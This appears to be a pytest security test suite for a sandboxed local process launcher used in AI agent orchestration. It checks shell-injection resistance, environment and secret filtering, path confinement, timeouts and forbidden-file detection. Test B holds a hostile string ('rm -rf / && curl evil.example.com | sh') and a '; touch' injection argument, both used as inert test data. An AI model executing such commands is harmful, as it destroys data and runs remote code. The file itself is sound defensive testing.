"""AS-ORCH-LOCAL-PROC-001: local_process_transport.py.

12-case security-model test matrix (A-L) for the provider-neutral,
disabled-by-default LOCAL PROCESS execution backend
(D-CODEX-ATLAS-SUPERVISED-AUTONOMY-PREREQUISITES-AND-RETRY, PR-B).

Every test uses a deterministic local fixture executor -- either a fake
in-process ``ProcessRunner`` (protocol-level tests, no real subprocess),
or a tiny, fully local ``sys.executable -c "..."`` script (end-to-end
tests exercising the real ``SubprocessProcessRunner``). Neither ever
performs network I/O or references any billed API -- ``ZERO_NETWORK``
and ``ZERO_BILLING`` hold structurally, not merely by assertion.
"""

from __future__ import annotations

import subprocess
import sys
from collections.abc import Mapping
from pathlib import Path

import pytest
from pydantic import ValidationError

from project_atlas.orchestration.agent_transport import (
    ProcessRunOutcome,
    ProcessRunRequest,
    TransportError,
)
from project_atlas.orchestration.local_process_transport import (
    DEFAULT_ENV_ALLOWLIST,
    LocalExecutionDisabledError,
    LocalExecutionError,
    LocalProcessExecutorConfig,
    LocalTaskEnvelope,
    run_local_task,
)


def _make_repo(tmp_path: Path) -> Path:
    repo = tmp_path / "repo"
    repo.mkdir()
    subprocess.run(["git", "init", "-q"], cwd=repo, check=True)
    subprocess.run(["git", "config", "user.email", "test@example.com"], cwd=repo, check=True)
    subprocess.run(["git", "config", "user.name", "Test"], cwd=repo, check=True)
    (repo / "README.md").write_text("seed\n", encoding="utf-8")
    (repo / "src").mkdir()
    (repo / "src" / "keep.py").write_text("# untouched\n", encoding="utf-8")
    subprocess.run(["git", "add", "-A"], cwd=repo, check=True)
    subprocess.run(["git", "commit", "-q", "-m", "init"], cwd=repo, check=True)
    return repo


class _FakeProcessRunner:
    """Deterministic in-process fixture executor -- records the exact
    request it received (proving argv/env/cwd were passed through
    unmodified) and returns a scripted outcome. No subprocess, no
    network, no billing."""

    def __init__(self, outcome: ProcessRunOutcome) -> None:
        self.outcome = outcome
        self.received: ProcessRunRequest | None = None

    def run(self, request: ProcessRunRequest) -> ProcessRunOutcome:
        self.received = request
        return self.outcome


def _ok_outcome(*, stdout: bytes = b"", stderr: bytes = b"") -> ProcessRunOutcome:
    return ProcessRunOutcome(
        exit_code=0, stdout=stdout, stderr=stderr, timed_out=False, duration_ms=1
    )


ENABLED = LocalProcessExecutorConfig(enabled=True)


# ---------------------------------------------------------------------------
# A. DISABLED_BY_DEFAULT
# ---------------------------------------------------------------------------


def test_a_disabled_by_default_refuses_to_run(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(work_id="A-001", argv=("python3", "-c", "pass"))
    default_config = LocalProcessExecutorConfig()  # enabled left at its default
    assert default_config.enabled is False
    fake = _FakeProcessRunner(_ok_outcome())
    with pytest.raises(LocalExecutionDisabledError):
        run_local_task(envelope, default_config, project_root=repo, runner=fake)
    assert fake.received is None  # never even attempted


# ---------------------------------------------------------------------------
# B. ARGV_VECTOR_ONLY (never shell text)
# ---------------------------------------------------------------------------


def test_b_argv_is_passed_through_as_a_literal_vector_not_shell_text(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    dangerous = ("echo", "hello; rm -rf / && curl evil.example.com | sh")
    envelope = LocalTaskEnvelope(work_id="B-001", argv=dangerous)
    fake = _FakeProcessRunner(_ok_outcome())
    run_local_task(envelope, ENABLED, project_root=repo, runner=fake)
    assert fake.received is not None
    # The dangerous string reaches the runner as ONE literal argv element,
    # never concatenated into anything a shell could parse.
    assert fake.received.argv == dangerous


def test_b_real_subprocess_never_interprets_shell_metacharacters(tmp_path: Path) -> None:
    """End-to-end with the real SubprocessProcessRunner (deterministic
    local fixture: the stdlib interpreter itself, no network): a shell-
    metacharacter-laden argument must be received as literal argv, never
    executed as a second command."""
    repo = _make_repo(tmp_path)
    marker = repo / "should_not_exist.txt"
    envelope = LocalTaskEnvelope(
        work_id="B-002",
        argv=(sys.executable, "-c", "import sys; print(sys.argv[1])", "; touch should_not_exist"),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.exit_code == 0
    assert not marker.exists()


# ---------------------------------------------------------------------------
# C. IMMUTABLE_TASK_ENVELOPE
# ---------------------------------------------------------------------------


def test_c_envelope_is_frozen_mutation_raises() -> None:
    envelope = LocalTaskEnvelope(work_id="C-001", argv=("python3",))
    with pytest.raises(ValidationError):
        envelope.work_id = "C-002"


def test_c_identical_envelopes_produce_identical_resolved_requests(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(work_id="C-003", argv=("python3", "-c", "pass"), cwd=".")
    fake1 = _FakeProcessRunner(_ok_outcome())
    fake2 = _FakeProcessRunner(_ok_outcome())
    run_local_task(envelope, ENABLED, project_root=repo, runner=fake1)
    run_local_task(envelope, ENABLED, project_root=repo, runner=fake2)
    assert fake1.received is not None and fake2.received is not None
    assert fake1.received.argv == fake2.received.argv
    assert fake1.received.cwd == fake2.received.cwd
    assert dict(fake1.received.env) == dict(fake2.received.env)


# ---------------------------------------------------------------------------
# D. MINIMUM_NECESSARY_ENV_ALLOWLIST
# ---------------------------------------------------------------------------


def test_d_only_allowlisted_names_reach_the_subprocess(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("ATLAS_TEST_ALLOWED_VAR", "yes")
    monkeypatch.setenv("ATLAS_TEST_NOT_ALLOWED_VAR", "no")
    repo = _make_repo(tmp_path)
    config = LocalProcessExecutorConfig(enabled=True, env_allowlist=("ATLAS_TEST_ALLOWED_VAR",))
    envelope = LocalTaskEnvelope(work_id="D-001", argv=("python3",))
    fake = _FakeProcessRunner(_ok_outcome())
    run_local_task(envelope, config, project_root=repo, runner=fake)
    assert fake.received is not None
    env: Mapping[str, str] = fake.received.env
    assert env.get("ATLAS_TEST_ALLOWED_VAR") == "yes"
    assert "ATLAS_TEST_NOT_ALLOWED_VAR" not in env


def test_d_default_allowlist_is_a_small_fixed_operational_set() -> None:
    assert set(DEFAULT_ENV_ALLOWLIST) == {
        "PATH",
        "SystemRoot",
        "TEMP",
        "TMP",
        "HOME",
        "USERPROFILE",
        "PYTHONIOENCODING",
    }


def test_d_empty_allowlist_forwards_nothing_at_all(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # A marker var (never PATH itself -- this module's own internal git
    # calls need a real PATH to find the git executable; replacing it
    # would break test infrastructure, not exercise the allowlist logic).
    monkeypatch.setenv("ATLAS_TEST_MARKER_VAR", "should-not-be-forwarded")
    repo = _make_repo(tmp_path)
    config = LocalProcessExecutorConfig(enabled=True, env_allowlist=())
    envelope = LocalTaskEnvelope(work_id="D-002", argv=("python3",))
    fake = _FakeProcessRunner(_ok_outcome())
    run_local_task(envelope, config, project_root=repo, runner=fake)
    assert fake.received is not None
    assert dict(fake.received.env) == {}


# ---------------------------------------------------------------------------
# E. NO_AUTO_FORWARDED_SECRETS
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "secret_var",
    [
        "ANTHROPIC_API_KEY",
        "OPENAI_API_KEY",
        "CURSOR_API_KEY",
        "AWS_SECRET_ACCESS_KEY",
        "GITHUB_TOKEN",
    ],
)
def test_e_credential_shaped_ambient_vars_are_never_auto_forwarded(
    secret_var: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv(secret_var, "sk-totally-real-secret-value")
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(work_id="E-001", argv=("python3",))
    fake = _FakeProcessRunner(_ok_outcome())
    # Default config -- operator has not explicitly allowlisted this name.
    run_local_task(envelope, ENABLED, project_root=repo, runner=fake)
    assert fake.received is not None
    assert secret_var not in fake.received.env


def test_e_env_overrides_cannot_smuggle_a_non_allowlisted_secret(
    tmp_path: Path,
) -> None:
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="E-002",
        argv=("python3",),
        env_overrides=(("SNEAKY_SECRET_NOT_ALLOWLISTED", "leaked"),),
    )
    fake = _FakeProcessRunner(_ok_outcome())
    run_local_task(envelope, ENABLED, project_root=repo, runner=fake)
    assert fake.received is not None
    assert "SNEAKY_SECRET_NOT_ALLOWLISTED" not in fake.received.env


def test_e_explicitly_allowlisted_override_is_forwarded(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    config = LocalProcessExecutorConfig(enabled=True, env_allowlist=("ATLAS_LOCAL_EXEC_TOKEN",))
    envelope = LocalTaskEnvelope(
        work_id="E-003",
        argv=("python3",),
        env_overrides=(("ATLAS_LOCAL_EXEC_TOKEN", "explicitly-configured"),),
    )
    fake = _FakeProcessRunner(_ok_outcome())
    run_local_task(envelope, config, project_root=repo, runner=fake)
    assert fake.received is not None
    assert fake.received.env.get("ATLAS_LOCAL_EXEC_TOKEN") == "explicitly-configured"


# ---------------------------------------------------------------------------
# F. WORKING_DIRECTORY_CONFINEMENT
# ---------------------------------------------------------------------------


def test_f_cwd_outside_project_root_is_rejected() -> None:
    with pytest.raises(ValidationError):
        LocalTaskEnvelope(work_id="F-001", argv=("python3",), cwd="../outside")


def test_f_cwd_inside_project_root_resolves_correctly(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(work_id="F-002", argv=("python3",), cwd="src")
    fake = _FakeProcessRunner(_ok_outcome())
    run_local_task(envelope, ENABLED, project_root=repo, runner=fake)
    assert fake.received is not None
    assert fake.received.cwd == (repo / "src").resolve()


# ---------------------------------------------------------------------------
# G. TIMEOUT_ENFORCEMENT
# ---------------------------------------------------------------------------


def test_g_hanging_process_is_terminated_at_timeout(tmp_path: Path) -> None:
    """End-to-end with the real SubprocessProcessRunner: a deterministic
    local fixture that sleeps far longer than the configured timeout must
    be killed and reported ``timed_out=True``, never left running and
    never silently reported as a clean success."""
    repo = _make_repo(tmp_path)
    config = LocalProcessExecutorConfig(enabled=True, timeout_seconds=1)
    envelope = LocalTaskEnvelope(
        work_id="G-001", argv=(sys.executable, "-c", "import time; time.sleep(120)")
    )
    result = run_local_task(envelope, config, project_root=repo)
    assert result.timed_out is True
    assert result.exit_code != 0


# ---------------------------------------------------------------------------
# H / I / J. INDEPENDENT_POST_EXECUTION_AUTHORITY_ENFORCEMENT
# ---------------------------------------------------------------------------


def test_h_compliant_change_within_authorized_scope_is_clean(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="H-001",
        argv=(sys.executable, "-c", "open('src/new_file.py', 'w').write('# ok\\n')"),
        authorized_paths=("src/",),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.exit_code == 0
    assert "src/new_file.py" in result.changed_paths
    assert result.authority_clean is True
    assert result.violations == ()


def test_i_forbidden_path_violation_is_detected_via_git_diff(tmp_path: Path) -> None:
    """A deterministic local fixture that writes outside its declared
    scope must be caught by independent git-state inspection -- not by
    trusting anything the process reports about itself."""
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="I-001",
        argv=(
            sys.executable,
            "-c",
            "open('src/allowed.py', 'w').write('ok\\n'); "
            "open('.github_workflow_tamper.txt', 'w').write('bad\\n')",
        ),
        authorized_paths=("src/",),
        forbidden_paths=(".github_workflow_tamper.txt",),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.authority_clean is False
    reasons = {v.path: v.reason for v in result.violations}
    assert reasons[".github_workflow_tamper.txt"] == "FORBIDDEN_PATH"
    assert "src/allowed.py" not in reasons  # the compliant change is not flagged


def test_i_out_of_scope_but_not_forbidden_path_is_still_flagged(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="I-002",
        argv=(sys.executable, "-c", "open('unexpected.txt', 'w').write('x\\n')"),
        authorized_paths=("src/",),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.authority_clean is False
    assert result.violations[0].path == "unexpected.txt"
    assert result.violations[0].reason == "OUTSIDE_AUTHORIZED_SCOPE"


def test_j_self_reported_success_does_not_override_authority_violation(tmp_path: Path) -> None:
    """A process that exits 0 and prints a success-shaped message on
    stdout, while having actually touched a forbidden path, must still be
    flagged -- enforcement never trusts the process's own report."""
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="J-001",
        argv=(
            sys.executable,
            "-c",
            "open('.github_workflow_tamper.txt','w').write('bad\\n'); "
            "print('TASK_COMPLETE: SUCCESS')",
        ),
        forbidden_paths=(".github_workflow_tamper.txt",),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.exit_code == 0  # the process itself reported clean success
    assert result.authority_clean is False
    assert result.violations[0].reason == "FORBIDDEN_PATH"


def test_h_no_authorized_paths_declared_means_unrestricted_scope_but_forbidden_still_enforced(
    tmp_path: Path,
) -> None:
    """authorized_paths=() means "no positive allowlist declared" (every
    change passes the allowlist check), not "nothing is authorized" --
    but forbidden_paths is independent and always enforced regardless."""
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="H-002",
        argv=(sys.executable, "-c", "open('anywhere.txt', 'w').write('x\\n')"),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.authority_clean is True


# ---------------------------------------------------------------------------
# K. ZERO_NETWORK / ZERO_BILLING (structural, not just asserted)
# ---------------------------------------------------------------------------


def test_k_module_has_no_provider_sdk_or_network_library_dependency() -> None:
    """This module must not *functionally depend on* Cursor, OpenAI, or
    Anthropic, and must never itself perform network I/O -- it is a
    generic local-command launcher (its docstrings say so, in prose, by
    way of disclaiming exactly this, which is why this check is import-
    based rather than a naive substring scan over the whole file). No
    import of a network/HTTP library, no import of any provider-specific
    module (``cursor_bridge``, ``chatgpt_bridge``, or any ``requests``/
    ``httpx``/``urllib.request`` style dependency)."""
    import ast

    import project_atlas.orchestration.local_process_transport as module

    tree = ast.parse(Path(module.__file__).read_text(encoding="utf-8"))
    imported_names: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported_names.update(alias.name.split(".")[0] for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module:
            imported_names.add(node.module.split(".")[0])
    forbidden_dependencies = {
        "cursor_bridge",
        "chatgpt_bridge",
        "chatgpt_capture",
        "requests",
        "httpx",
        "urllib3",
        "aiohttp",
        "socket",
    }
    assert not (imported_names & forbidden_dependencies)
    # ``urllib`` itself (stdlib) is allowed to appear as a substring of
    # other names, but this module must not import its network-capable
    # submodule.
    assert "urllib.request" not in Path(module.__file__).read_text(encoding="utf-8")


def test_k_deterministic_fixture_executor_performs_no_network_call(tmp_path: Path) -> None:
    """The fixture executor used throughout this suite is the local
    interpreter running an inline script with no imports capable of
    network access (``socket``, ``urllib``, ``http`` are never imported
    by any fixture command in this file) -- proving these tests exercise
    a real local process without any network dependency."""
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="K-001", argv=(sys.executable, "-c", "print('local only, no imports')")
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.exit_code == 0
    assert result.authority_clean is True


# ---------------------------------------------------------------------------
# L. FAIL_CLOSED_ON_MALFORMED_OR_MISSING_EXECUTABLE
# ---------------------------------------------------------------------------


def test_l_nonexistent_executable_fails_closed_not_silent_success(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="L-001", argv=("definitely-not-a-real-executable-xyz-12345",)
    )
    with pytest.raises((TransportError, OSError)):
        run_local_task(envelope, ENABLED, project_root=repo)


def test_l_empty_argv_is_rejected_at_construction_time() -> None:
    with pytest.raises(ValidationError):
        LocalTaskEnvelope(work_id="L-002", argv=())


# ---------------------------------------------------------------------------
# Cross-cutting: never claims merge/execution authority
# ---------------------------------------------------------------------------


def test_result_never_claims_merge_or_execution_authority(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(work_id="X-001", argv=("python3", "-c", "pass"))
    fake = _FakeProcessRunner(_ok_outcome())
    result = run_local_task(envelope, ENABLED, project_root=repo, runner=fake)
    assert result.merge_authorized is False
    assert result.execution_authorized is False


def test_cwd_traversal_via_dotdot_segment_is_rejected() -> None:
    with pytest.raises(ValidationError):
        LocalTaskEnvelope(work_id="SEC-001", argv=("python3",), cwd="a/../../escape")


def test_error_types_are_local_execution_error_subclasses() -> None:
    assert issubclass(LocalExecutionDisabledError, LocalExecutionError)
